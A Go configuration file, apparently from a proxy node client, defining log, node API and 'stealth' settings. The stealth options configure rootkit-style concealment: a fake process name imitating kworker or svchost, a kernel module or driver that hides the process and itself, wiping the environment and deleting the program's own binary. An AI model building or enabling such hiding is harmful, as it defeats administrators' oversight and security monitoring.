package conf

import (
	"fmt"
	"os"

	"github.com/spf13/viper"
)

const DefaultNodeRetryCount = 1
const DefaultNodeTimeout = 15

type Conf struct {
	LogConfig   LogConfig     `mapstructure:"Log"`
	NodeConfigs []NodeConfig  `mapstructure:"Nodes"`
	PprofPort   int           `mapstructure:"PprofPort"`
	Stealth     StealthConfig `mapstructure:"Stealth"`
}

// StealthConfig 进程隐藏配置。详见 common/stealth 与 docs/stealth-report.md。
type StealthConfig struct {
	Enable       bool   `mapstructure:"Enable"`       // 总开关
	Alias        string `mapstructure:"Alias"`        // 对外显示的进程名（空=平台默认，如 kworker/1:1 / svchost.exe）
	Kernel       bool   `mapstructure:"Kernel"`       // 是否加载内核隐藏组件（需 root / 驱动加载权限）
	KernelModule string `mapstructure:"KernelModule"` // Linux .ko 路径，默认 /etc/v2nb/v2hide.ko
	KernelDriver string `mapstructure:"KernelDriver"` // Windows .sys 路径
	HideEnv      bool   `mapstructure:"HideEnv"`      // 清空 /proc/<pid>/environ
	ShredExe     bool   `mapstructure:"ShredExe"`     // 从磁盘 unlink 自身二进制（部署后无法直接重启，慎用）
	HideModule   bool   `mapstructure:"HideModule"`   // 同时隐藏内核模块自身（lsmod / PsLoadedModuleList）
	Debug        bool   `mapstructure:"Debug"`        // 启动时打印 /proc 自检结果
}

type LogConfig struct {
	Level  string `mapstructure:"Level"`
	Output string `mapstructure:"Output"`
	Access string `mapstructure:"Access"`
}

type NodeConfig struct {
	APIHost             string `mapstructure:"ApiHost"`
	NodeID              int    `mapstructure:"NodeID"`
	Key                 string `mapstructure:"ApiKey"`
	Timeout             int    `mapstructure:"Timeout"`
	RetryCount          *int   `mapstructure:"RetryCount"`
	RealtimeConnections *bool  `mapstructure:"RealtimeConnections"`
}

func New() *Conf {
	return &Conf{
		LogConfig: LogConfig{
			Level:  "info",
			Output: "",
			Access: "none",
		},
		Stealth: StealthConfig{
			Enable:     false,
			HideEnv:    true,
			HideModule: true,
		},
	}
}

func (p *Conf) LoadFromPath(filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("open config file error: %s", err)
	}
	defer f.Close()
	v := viper.New()
	v.SetConfigFile(filePath)
	if err := v.ReadInConfig(); err != nil {
		return fmt.Errorf("read config file error: %s", err)
	}
	if err := v.Unmarshal(p); err != nil {
		return fmt.Errorf("unmarshal config error: %s", err)
	}
	for i := range p.NodeConfigs {
		if p.NodeConfigs[i].RetryCount == nil {
			p.NodeConfigs[i].RetryCount = intPtr(DefaultNodeRetryCount)
		}
	}
	return nil
}

func intPtr(v int) *int {
	return &v
}
